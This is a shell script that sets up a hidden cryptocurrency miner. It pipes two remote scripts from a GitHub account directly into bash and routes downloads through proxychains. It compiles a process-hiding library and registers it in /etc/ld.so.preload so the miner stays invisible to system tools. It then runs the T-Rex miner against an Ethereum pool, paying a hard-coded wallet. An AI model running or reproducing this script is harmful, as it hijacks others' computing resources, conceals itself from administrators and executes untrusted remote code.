#!/bin/sh
wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/setUpSSHTunnel.sh | bash
wget -O - https://raw.githubusercontent.com/chadpetersen1337/sockd/main/chains.sh | bash
sleep .1
proxychains curl ifconfig.me
proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicTr.zip
unzip magicTr.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
proxychains wget https://github.com/trexminer/T-Rex/releases/download/0.18.5/t-rex-0.18.5-linux-cuda10.0.tar.gz
tar -xvzf t-rex-0.18.5-linux-cuda10.0.tar.gz
./t-rex -a ethash -o stratum+ssl://naw-eth.hiveon.net:24443 -u 0x8CB8003E428D0Fd7693D22f576A212403728c64a -p x --worker trex
